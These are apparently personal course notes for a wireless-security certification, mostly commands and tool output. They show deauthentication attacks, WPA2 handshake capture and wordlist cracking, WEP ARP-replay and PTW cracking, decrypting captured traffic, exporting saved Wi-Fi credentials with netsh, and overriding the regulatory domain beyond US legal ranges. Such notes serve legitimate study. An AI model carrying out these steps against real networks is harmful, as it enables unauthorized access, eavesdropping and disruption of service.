# Notes for GAWN

## Wifi 

### 802.11 configuration   

#### Manual

Show devices   
- `iw phy`   
- `ls /sys/class/ieee80211/`

Show interfaces   
- `iw dev`   
- `iwconfig`   
- `ifconfig -a`

Create interface from phy device   
- `iw phy phy0 interface add wlan0 type managed`

Set device interface to monitor mode   
- `iw dev wlan0 interface add mon0 type monitor`    
- `iwconfig wlan0 mode monitor`   

Delete device interface   
- `iw dev mon0 del`

Get information on device interface   
- `iw dev mon0 info`

Set device interface to specific channel   
- `iw dev mon0 set channel 1`   
- `iw dev mon0 set channel 1 HT40+`

Set Regulatory Domain Settings(to use ranges outside legal in US)   
- `iw reg set CH`

#### Automatic

Set device interface to monitor mode   
- `airmon-ng start wlan0`

Set device interface channel   
- `airmon-ng start wlan0 11`

Kill confliting processes   
- `airmon-ng check kill`

### Capturing Data

#### TCPDUMP

Important flags   
- `-i `  Specify interface to capture on
- `-e`   Print MAC addresses and BSSID
- `-n`   Skip DNS lookups
- `-s`   Set capture snap length
- `-X`   Print payload in ascii and hex

#### Airodump-ng

Capture all channels while channel hoping   
`airodump-ng -w savefile wlan0mon`   

Capture on single channel   
`airodump-ng -w savefile -c 5 wlan0mon`   

#### Wireshark

Filters
- eq, ==
- ne, !=
- gt, >
- lt, <
- ge, >=
- le, <=
- contains
- and
- or
- not
- !wlan.fc.type_subtype == 8   "excludes beacon frames"
- !wlan.fc.protected == 1      "excludes encrypted networks"
- wlan.bssid == 00:11:22:33:44:55  "find exact bssid"
- frame contains ORA-  "finds string matching ORA- exactly useful for finding oracle traffic"

### Attacking 802.11 Protocols   
#### Cracking WPA/WPA2 

Scan all channels   
`airodump-ng wlan0mon`

```bash
CH  6 ][ Elapsed: 18 s ][ 2020-03-16 20:58

 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 14:59:C0:XX:XX:XX  -16        5        0    0   4  195  WPA2 CCMP   PSK  NETGEAR73
 16:59:C0:XX:XX:XX  -16        5        0    0   4  195  WPA2 CCMP   PSK  NETGEAR-Guest
```
Deauthentication to Capture handshake   

<a href="https://youtu.be/DqjOqEwq8uE" title="Deauth attack"><img src="https://github.com/vipertooth/Notes/blob/master/SEC617/images/Death-screenshot.png"/></a>


`aireplay-ng --deauth 5 -e NETGEAR-Guest wlan0mon`     
`airodump-ng -c 4 -d 16:59:C0:XX:XX:XX -w savefile wlan0mon`   



Crack WPA2   
`aircrack-ng -w /usr/share/wordlists/rockyou.txt savefile.cap`   

```bash

                                 Aircrack-ng 1.2

      [00:00:00] 16/7120712 keys tested (1128.27 k/s)

      Time left: 1 hour, 45 minutes, 12 seconds                  0.00%

                           KEY FOUND! [ EASYPASSWD ]


      Master Key     : FD 3F 34 FD 32 6F 4D 16 DB 9B DA 5B B6 47 58 63
                       94 48 19 58 A5 42 E5 85 4F 3D CB BC 11 79 C9 74

      Transient Key  : 83 0F D3 B8 20 0C 22 AD 61 2D CD 1D 9E 40 05 AF
                       D6 EC CE 53 E7 0E D0 5D DA 23 46 BF 56 C0 0A 10
                       A3 47 7E 7B 32 9D 0D 61 62 1F D2 82 76 9F 55 29
                       F9 E1 E2 7C 59 85 4F C8 E5 4D F1 B9 8C 9D 00 A6

      EAPOL HMAC     : E7 2C 3E D2 EC F6 5E 1B E0 6C 68 B5 92 74 6C 0C
```
#### Converting WPA/WPA2 Capture to Hashcat Crackable Format   
```bash
root@SEC617:~/notes# aircrack-ng -j hashcatfile savefile.cap 
Reading packets, please wait...
Opening savefile.cap
Read 1176 packets.

   #  BSSID              ESSID                     Encryption

   1  16:59:C0:95:DB:06  NETGEAR-Guest             WPA (1 handshake, with PMKID)

Choosing first network as target.

Reading packets, please wait...
Opening handshake.pcap-01.cap
Read 1176 packets.

1 potential targets



Building Hashcat (3.60+) file...

[*] ESSID (length: 13): NETGEAR-Guest
[*] Key version: 2
[*] BSSID: 16:59:C0:95:DB:06
[*] STA: AC:37:43:4C:82:F9
[*] anonce:
    15 7C 2D E1 1B DD 65 57 3A C4 E2 2D 21 F7 2D 80 
    32 F4 33 EB A9 D7 D4 B8 58 52 07 8C AC 5B 9F CC 
[*] snonce:
    6F F9 B3 A1 EA 4F B6 F4 46 E4 D2 49 DC 78 11 F8 
    24 1C FE 92 07 E8 C8 45 5F 1C 6E 76 AD 73 AE C5 
[*] Key MIC:
    E7 2C 3E D2 EC F6 5E 1B E0 6C 68 B5 92 74 6C 0C
[*] eapol:
    01 03 00 75 02 01 0A 00 00 00 00 00 00 00 00 00 
    00 6F F9 B3 A1 EA 4F B6 F4 46 E4 D2 49 DC 78 11 
    F8 24 1C FE 92 07 E8 C8 45 5F 1C 6E 76 AD 73 AE 
    C5 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
    00 00 16 30 14 01 00 00 0F AC 04 01 00 00 0F AC 
    04 01 00 00 0F AC 02 0C 00 

Successfully written to hashcatfile.hccapx
```

#### Generating WEP Traffic

```bash
root@vipertooth:~# airodump-ng -c 2 -b 16:59:C0:95:DB:06 wlan0mon
Notice: Channel range already given

 CH  2 ][ Elapsed: 6 mins ][ 2020-03-17 11:56 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 16:59:C0:95:DB:06  -15   0      376       24    0   1  195   WEP  WEP         wep            
 14:59:C0:95:DB:05  -15   0      378       86    0   1  195   WPA2 CCMP   PSK  NETGEAR73                
 30:09:F9:D2:41:FB  -30   3        2        0    0   1   65   WPA  CCMP   PSK  <length:  0>             
 98:DA:C4:0A:1B:59  -39   0        2        0    0   2  195   WPA  CCMP   PSK  MorganWiFi               

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 (not associated)   E0:B9:4D:AA:31:DA  -40    0 - 1      0      219         T3HP4D                       
 16:59:C0:95:DB:06  AC:37:43:4C:82:F9  -16    1e- 1e     2      128         wep                

root@vipertooth:~# aireplay-ng -b 16:59:C0:95:DB:06 --arpreplay wlan0mon
No source MAC (-h) specified. Using the device MAC (9C:EF:D5:FC:8C:DD)
13:11:50  Waiting for beacon frame (BSSID: 16:59:C0:95:DB:06) on channel 1
Saving ARP requests in replay_arp-0317-131150.cap
You should also start airodump-ng to capture replies.
Read 1583 packets (got 456 ARP requests and 444 ACKs), sent 567 packets...(0 pps)
```

#### Cracking WEP

```bash
root@vipertooth:~# aircrack-ng wep.pcap                               
Opening wep.pcap                                                      
Read 92091 packets.                                                   
                                                                      
   #  BSSID              ESSID                     Encryption         
                                                                      
   1  6C:70:9F:DE:66:89  TH3PAD                    WPA (0 handshake)  
   2  88:1F:A1:32:A7:F9  Vulnerable Bank           WPA (0 handshake)  
   3  85:4D:68:07:4D:8F  wep                       WEP (98468 IVs)    
   4  00:1C:DF:B2:E6:47  jeff                      WPA (0 handshake)   
                                                                       
Index number of target network ? 3                                     
                                                                       
Opening wep.pcap                                                                                       
Attack will be restarted every 5000 captured ivs.                      
Starting PTW attack with 98468 ivs.                                    

                                             Aircrack-ng 1.2 


                             [00:00:02] Tested 1397591 keys (got 98468 IVs)

   KB    depth   byte(vote)
    0    0/  1   E2(109056) 2F(97536) A5(97536) 44(94464) 87(94464) D7(93952) 06(93696) 
    1    0/  1   28(113152) 33(98816) E2(97792) 3C(97280) 03(95232) 28(94208) E5(93952) 
    2    0/  1   9E(112640) 01(99072) FE(97024) 9B(96256) F1(94976) 72(94464) 73(93696) 
    3    0/  1   0F(111872) 1C(96000) 6A(95488) 4C(94720) 55(94208) FD(94208) BA(93952) 
    4    0/  1   19(109568) 79(97536) AF(96000) 5E(94976) 74(94208) E0(94208) D4(93952) 
    5    0/  1   4A(116992) 48(95232) EB(94720) 82(94464) D1(94208) DD(94208) B5(93952) 
    6    0/  1   B7(102400) EE(99584) 25(96000) 70(96000) DB(94464) C0(94208) 6C(93184) 
    7    0/  1   1A(108032) 72(98304) F8(97280) 31(96256) 8F(95232) D4(94976) 12(94208) 
    8    1/  8   30(93696) D4(93184) 84(92928) FB(92672) 02(92416) 13(92416) 1F(92416) 
    9    0/  1   33(115712) 9C(97024) B1(96256) 24(94720) 0B(94464) 08(93952) 4E(93184) 
   10    1/  1   7C(93440) A9(93440) 13(93184) 69(92672) BE(92672) E3(92416) E0(91904) 
   11    1/  1   8F(95232) 65(94208) 41(93696) 9A(93696) D1(92672) 2C(92160) 6C(91904) 
   12    0/  1   54(100564) 47(96416) 83(95224) A9(94572) 12(94504) 0D(93584) AA(93072) 

             KEY FOUND! [ E2:28:9E:0F:19:4A:B7:1A:9F:33:53:55:54 ] 
        Decrypted correctly: 100%
```

#### Decrypting Captured Traffic

```bash
root@vipertooth:~# airdecap-ng -w E2:28:9E:0F:19:4A:B7:1A:9F:33:53:55:54 wep.pcap
Total number of packets read         92091
Total number of WEP data packets     85824
Total number of WPA data packets         3
Number of plaintext data packets        14
Number of decrypted WEP  packets     83972
Number of corrupted WEP  packets         0
Number of decrypted WPA  packets         0

root@SEC617:~/notes# airdecap-ng -p EASYPASSWD -e 16:59:C0:XX:XX:XX savefile.cap
Total number of stations seen            2
Total number of packets read          1176
Total number of WEP data packets         0
Total number of WPA data packets         1
Number of plaintext data packets         0
Number of decrypted WEP  packets         0
Number of corrupted WEP  packets         0
Number of decrypted WPA  packets         0
Number of bad TKIP (WPA) packets         0
Number of bad CCMP (WPA) packets         0

root@vipertooth:~# ls -la
total 130804
drwxr-xr-x  2 root root     4096 Mar 17 10:44 .
drwxr-xr-x 19 root root     4096 Mar 17 09:59 ..
-rw-r--r--  1 root root    44408 Mar 16 21:08 savefile.cap
-rw-r--r--  1 root root       24 Mar 17 10:45 savefile-dec.cap
-rw-r--r--  1 root root 64174740 Mar 17 10:43 wep-dec.pcap
-rw-r--r--  1 root root 69695613 Mar 17 10:03 wep.pcap

```
### Windows CMD   
#### Bridging Connections Windows CMD
```cmd
C:\> netsh wlan set partynetwork mode=allow ssid=party key=Password
C:\> netsh wlan start partynetwork
```
#### Get Wifi creds

```cmd
C:\> netsh wlan show interface
C:\> netsh wlan show profiles
C:\> netsh wlan export profile <profile here>
```
#### Discover wireless networks
```cmd
C:\> netsh wlan show networks
```
#### Connect to wireless network from CMD
```cmd
C:\> netsh wlan connect name="Profile"
```
#### Import saved profile to cmd
```cmd
C:\> netsh wlan add profile "saved_file.xml"
```
### Linux CMD

TODO
